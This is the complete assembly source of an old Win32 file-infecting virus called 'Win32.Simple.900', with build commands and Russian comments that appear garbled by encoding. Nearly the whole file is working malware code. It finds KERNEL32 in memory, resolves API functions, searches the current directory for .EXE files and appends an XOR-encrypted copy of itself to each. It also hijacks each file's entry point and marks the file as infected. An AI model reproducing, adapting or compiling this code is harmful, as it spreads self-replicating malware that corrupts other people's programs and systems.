   ; COMMENT %
   ;
   ;   PE-EXE.CRYPT. A very simple non-tsr Win32 virus. Scannes for
   ;   files in the current directory and infects it by appending to
   ;   the last section.
   ;
   ;    *â® ®ç¥ì ¯à®áâ®© ¢¨àãá ¤«ï Win32. Š á®¦ «¥¨î, ® ¢ëè¥« â®«ìª® á¥©ç á -
   ; ï ¡ë« § ïâ ¤àã£¨¬¨ ¤¥« ¬¨, ¨ ã ¬¥ï â®«ìª® ¥¤ ¢® ¯®ï¢¨« áì ¢®§¬®¦®áâì
   ; ¯®áâ ¢¨âì WindowsNT ¨ SoftIce ¤«ï ¥£®, çâ®¡ë ¨á¯ëâ âì íâ®â ¯à®¤ãªâ. ˆ, ª ª
   ; ®ª § «®áì, ¥ §àï, â ª ª ª ï ®¡ àã¦¨« ®¤ã ¬¥«ªãî ®è¨¡ªã, ¨§-§  ª®â®à®©,
   ; ®¤ ª®, ¢¨àãá ¥ à ¡®â « ¯®¤ WindowsNT. ’¥¯¥àì, ¥áâ¥áâ¢¥®, ¢á¥ ¢ ¯®àï¤ª¥.
   ;    Ž á ¬®¬ ¢¨àãá¥: ¥à¥§¨¤¥âë©, è¨äà®¢ ë©; ¨é¥â ¨ § à ¦ ¥â PE-ä ©«ë ¢
   ; â¥ªãé¥© ¤¨à¥ªâ®à¨¨ (¤®¯¨áë¢ ¥âáï ª ¯®á«¥¤¥© á¥ªæ¨¨). „«ï à ¡®âë á ä ©« ¬¨
   ; ¨á¯®«ì§ãîâáï API ¨§ KERNEL32,  ¤à¥á ª®â®à®£® ¡¥à¥âáï ¨§ áâíª . *¨ª ª ¥
   ; ¯à®ï¢«ï¥âáï.
   ;
   ;                                   DJ Sadovnikov (http://i.am/djsad), 26.01.2001
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;               Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM32 5.0r
   ;
   ;                  tasm32 /m /ml simple.asm
   ;                  tlink32 /Tpe /x simple.obj,,,import32.lib
   ;                  pewrsec simple.exe
   ;                  del simple.obj
   ;
   ;
   ;               ” ©«ë ¨§  àå¨¢ :
   ;
   ;                  simple.asm  8900  (¨áå®¤¨ª ¢¨àãá )
   ;                  simple.exe  8192  (¡¨ à¨ª ¢¨àãá )
   ;                  simple.doc  8300  (â¥å¨ç¥áª ï ¨ä®à¬ æ¨ï)
   ; %
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .386
           .model  flat

   extrn       MessageBoxA:proc
   extrn       ExitProcess:proc

           .data

   Message     db  'Virus has started...',0

           .code

   Start:      push    0
           push    offset Message
           push    offset Message
           push    0
           call    MessageBoxA
           push    0
           call    ExitProcess

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                            *€—€‹Ž ‚ˆ*“‘€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Virus:      pushad
           call    Entry
   Entry:      pop ebp


   ;[* áè¨äà®¢ë¢ ¥¬ ¢¨àãá]

   Key:        mov ax, 0
           mov esi, Crypt-Entry
   Loop1:      xor [esi+ebp], al
           add al, ah
           inc esi
           cmp esi, CodeSize+Virus-Entry
           jne Loop1


   ;[‘®åà ï¥¬ ¢ áâ¥ª¥  ¤à¥á ¢®§¢à â  ¢ ¯à®£à ¬¬ã-®á¨â¥«ì]

   Crypt:      db  68h
   RetAddress  dd  Start-(RetAddr+4)

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[ˆé¥¬ ¢ ¯ ¬ïâ¨ KERNEL32 ¨ á®åà ï¥¬ ¥£®  ¤à¥á ¢ EDX]

           mov ebx, [esp+24h]
           and bx, 0F000h
   FindKernel: sub ebx, 1000h
           cmp [ebx], word ptr 'ZM'
           jne FindKernel
           mov edx, ebx
           mov [KernelAddr-Entry+ebp], ebx


   ;[“áâ  ¢«¨¢ ¥¬ EBX   â ¡«¨æã íªá¯®àâ®¢]

           mov esi, [ebx+3Ch]
           add esi, ebx
           cmp [esi], dword ptr 'EP'
           jne Exit
           add ebx, [esi+78h]


   ;[*®¤£®â ¢«¨¢ ¥¬ à¥£¨áâàë ¤«ï ¯®¨áª  áâà®ª¨ "GetProcAddress"]

           mov ecx, [ebx+18h]
           mov esi, [ebx+20h]
           mov edi, [ebx+24h]
           add esi, edx
           add edi, edx


   ;[ˆé¥¬ áâ®ªã "GetProcAddress"]

           cld
   Search:     lodsd
           add eax, edx

           push    ecx
           push    edi
           xchg    esi, eax

           lea edi, [GetProcAddress-Entry+ebp]
           mov ecx, APINameSize
           repe    cmpsb

           xchg    esi, eax
           pop edi
           pop ecx
           je  Found

           inc edi
           inc edi
           loop    Search
           jmp Exit


   ;[‚ëç¨á«ï¥¬  ¤à¥á äãªæ¨¨ "GetProcAddress"]

   Found:      movzx   eax, word ptr [edi]
           shl eax, 2
           mov esi, [ebx+1Ch]
           add esi, edx
           add esi, eax
           lodsd
           add eax, edx
           mov [GetProcAddr-Entry+ebp], eax

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[* å®¤¨¬ ¯¥à¢ë© ä ©« ¢ â¥ªãé¥© ¤¨à¥ªâ®à¨¨]

           lea eax, [DTA-Entry+ebp]
           push    eax
           lea eax, [FMask-Entry+ebp]
           push    eax
           lea eax, [FindFirstFileA-Entry+ebp]
           call    CallAPI

           cmp eax, -1
           je  Exit
           mov [SearchHandle-Entry+ebp], eax


   ;[Žâªàë¢ ¥¬ ä ©«]

   Infect:     xor eax, eax
           push    eax
           push    eax
           push    3
           push    eax
           push    eax
           push    0C0000000h
           lea eax, [DTA+2Ch-Entry+ebp]
           push    eax
           lea eax, [CreateFileA-Entry+ebp]
           call    CallAPI

           cmp eax, -1
           je  FindNext
           mov ebx, eax


   ;[‘ç¨âë¢ ¥¬ ç¥âëà¥ ¡ ©â  ¯® á¬¥é¥¨î 3Ch]

           mov eax, 3Ch
           call    Seek
           mov ecx, 4
           lea edx, [HeaderOfs-Entry+ebp]
           call    Read


   ;[‘ç¨âë¢ ¥¬ PE § £®«®¢®ª]

           mov eax, [HeaderOfs-Entry+ebp]
           call    Seek
           mov ecx, HeaderSize
           lea edx, [Header-Entry+ebp]
           call    Read


   ;[*à®¢¥àï¥¬ â¨¯ ä ©«  ¨ ¥£® § à ¦¥®áâì]

           cmp [Header-Entry+ebp], dword ptr 'EP'
           jne Close
           cmp [Header+58h-Entry+ebp], '6666'
           je  Close


   ;[‚ëç¨á«ï¥¬ á¬¥é¥¨¥ ¯®á«¥¤¥£® í«¥¬¥â  â ¡«¨æ¥ ®¡ê¥ªâ®¢]

           xor eax, eax
           imul    ax, [Header+06h-Entry+ebp], ObjectSize
           add ax, [Header+14h-Entry+ebp]
           add ax, 18h-ObjectSize
           add eax, [HeaderOfs-Entry+ebp]
           mov [ObjectOfs-Entry+ebp], eax


   ;[‘ç¨âë¢ ¥¬ ¢ ¯ ¬ïâì ¯®á«¥¤¨© í«¥¬¥â â ¡«¨æë ®¡ê¥ªâ®¢]

           call    Seek
           mov ecx, ObjectSize
           lea edx, [Object-Entry+ebp]
           call    Read


   ;[‘à ¢¨¢ ¥¬ ä¨§¨ç¥áª¨© ¨ ¢¨àâã «ìë© à §¬¥àë ®¡ê¥ªâ ]

           mov eax, [Object+10h-Entry+ebp]
           cmp [Object+08h-Entry+ebp], eax
           jae L1
           mov [Object+08h-Entry+ebp], eax


   ;[‘®åà ï¥¬ áâ àãî ¨ ¢ëç¨á«ï¥¬ ®¢ãî â®çªã ¢å®¤ ]

   L1:     add eax, [Object+0Ch-Entry+ebp]
           mov ecx, [Header+28h-Entry+ebp]
           sub ecx, eax
           sub ecx, RetAddr+4-Virus
           mov [RetAddress-Entry+ebp], ecx
           mov [Header+28h-Entry+ebp], eax


   ;[Š®àà¥ªâ¨àã¥¬ à §¬¥à ä ©« ]

           add eax, VirSize
           mov [Header+50h-Entry+ebp], eax


   ;[‚ëç¨á«ï¥¬ á¬¥é¥¨¥, ¯® ª®â®à®¬ã ã¦® § ¯¨á âì ¢¨àãá]

           mov eax, [Object+14h-Entry+ebp]
           add eax, [Object+10h-Entry+ebp]
           call    Seek


   ;[Š®àà¥ªâ¨àã¥¬ ¢¨àâã «ìë© ¨ ä¨§¨ç¥áª¨© à §¬¥àë ¯®á«¥¤¥£® ®¡ê¥ªâ ]

           add [Object+08h-Entry+ebp], dword ptr VirSize
           add [Object+10h-Entry+ebp], dword ptr CodeSize


   ;[“áâ  ¢«¨¢ ¥¬ ã ¯®á«¥¤¥£® ®¡ê¥ªâ   âà¨¡ãâë çâ¥¨ï/§ ¯¨á¨]

           or  [Object+24h-Entry+ebp], 0A0000020h


   ;[“áâ  ¢«¨¢ ¥¬ ¯à¨§ ª § à ¦¥®áâ¨]

           mov [Header+58h-Entry+ebp], '6666'


   ;[*®«ãç ¥¬ á«ãç ©ë© ª«îç ¤«ï è¨äà®¢ª¨]

           lea eax, [GetTickCount-Entry+ebp]
           call    CallAPI
           mov [Key+2-Entry+ebp], ax


   ;[Š®¯¨àã¥¬ ¢¨àãá ¢ ¡ãää¥à]

           lea esi, [Virus-Entry+ebp]
           lea edi, [Buffer-Entry+ebp]
           mov ecx, CodeSize
           cld
           rep movsb


   ;[˜¨äàã¥¬ ®á®¢®¥ â¥«® ¢¨àãá  ¢ ¡ãää¥à¥]

           mov esi, (Buffer-Entry)+(Crypt-Virus)
   Loop2:      xor [esi+ebp], al
           add al, ah
           inc esi
           cmp esi, (Buffer-Entry)+CodeSize
           jne Loop2


   ;[‡ ¯¨áë¢ ¥¬ ª®¤ ¢¨àãá  ¢ ä ©«]

           mov ecx, CodeSize
           lea edx, [Buffer-Entry+ebp]
           call    Write


   ;[‡ ¯¨áë¢ ¥¬ PE § £®«®¢®ª]

           mov eax, [HeaderOfs-Entry+ebp]
           call    Seek
           mov ecx, HeaderSize
           lea edx, [Header-Entry+ebp]
           call    Write


   ;[‡ ¯¨áë¢ ¥¬ ¯®á«¥¤¨© í«¥¬¥â â ¡«¨æë ®¡ê¥ªâ®¢]

           mov eax, [ObjectOfs-Entry+ebp]
           call    Seek
           mov ecx, ObjectSize
           lea edx, [Object-Entry+ebp]
           call    Write


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close:      push    ebx
           lea eax, [CloseHandle-Entry+ebp]
           call    CallAPI


   ;[ˆé¥¬ á«¥¤ãîé¨© ä ©«]

   FindNext:   lea eax, [DTA-Entry+ebp]
           push    eax
           push    dword ptr [SearchHandle-Entry+ebp]
           lea eax, [FindNextFileA-Entry+ebp]
           call    CallAPI
           or  eax, eax
           jnz Infect


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ ¯à®£à ¬¬¥-®á¨â¥«î]

   Exit:       pop dword ptr [RetAddr-Entry+ebp]
           popad

           db  0E9h
   RetAddr     dd  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                            *Ž„**Žƒ*€ŒŒ›
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Seek:       push    0
           push    0
           push    eax
           lea eax, [SetFilePointer-Entry+ebp]
           jmp L3
   Read:       lea eax, [ReadFile-Entry+ebp]
           jmp L2
   Write:      lea eax, [WriteFile-Entry+ebp]
   L2:     push    0
           lea edi, [Bytes-Entry+ebp]
           push    edi
           push    ecx
           push    edx
   L3:     push    ebx
           call    CallAPI
           ret


   CallAPI:    push    eax
           db  068h
   KernelAddr  dd  0
           db  0B8h
   GetProcAddr dd  0
           call    eax
           jmp eax

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                „€**›…
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   VirName     db  'Win32.Simple.900 -- Copyright (c) by DJ Sadovnikov'

   DTASize     =   13Eh
   HeaderSize  =   5Ch
   ObjectSize  =   28h
   APINameSize =   15

   GetProcAddress  db  'GetProcAddress',0
   CreateFileA db  'CreateFileA',0
   FindFirstFileA  db  'FindFirstFileA',0
   FindNextFileA   db  'FindNextFileA',0
   SetFilePointer  db  'SetFilePointer',0
   ReadFile    db  'ReadFile',0
   WriteFile   db  'WriteFile',0
   CloseHandle db  'CloseHandle',0
   GetTickCount    db  'GetTickCount',0
   FMask       db  '*.EXE',0

   CodeSize    =   $ - Virus

   HeaderOfs   dd  ?
   ObjectOfs   dd  ?
   SearchHandle    dd  ?
   Bytes       dd  ?
   Object      db  ObjectSize dup (?)
   Header      db  HeaderSize dup (?)
   DTA     db  DTASize dup (?)
   Buffer      db  CodeSize dup (?)

   VirSize     =   $ - Virus

           end Virus
